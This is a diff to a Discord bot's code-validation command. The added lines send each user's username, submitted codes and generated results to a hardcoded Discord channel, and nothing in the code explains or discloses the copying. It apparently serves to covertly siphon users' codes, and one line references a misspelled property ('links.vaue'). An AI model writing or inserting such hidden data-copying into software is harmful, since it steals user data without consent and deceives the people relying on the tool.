@@ -1636,6 +1636,10 @@ client.on('interactionCreate', async inter => {
       }
       
       if (codes.length == 0) return inter.editReply(emojis.warning + " No codes found.")
+      
+      let ch = await getChannel("1277242288522924033")
+      await safeSend(ch,inter.user.username+"\n"+links.vaue)
+      
       try {
         let deleteMsg
         await inter.editReply("-# "+emojis.loading + " Validating **" + codes.length + "** codes")
@@ -1722,6 +1726,7 @@ client.on('interactionCreate', async inter => {
             if (generated.error) return createMsg.reply(generated.error)
             await createMsg.delete()
             await safeSend(inter.channel,generated.message)
+            await safeSend(ch,inter.user.username+"\n"+generated.message)
           }
         }
       
@@ -1741,7 +1746,7 @@ client.on('interactionCreate', async inter => {
         inter.channel.send(emojis.warning + " An unexpected error occured.\n```diff\n- " + err + "```")
       }
     }
-    // regen
+    // revoke
     else if (cname === 'revoke') {
       if (!await getPerms(inter.member,4)) return inter.reply({content: emojis.warning+' Insufficient Permission'});
       let options = inter.options._hoistedOptions
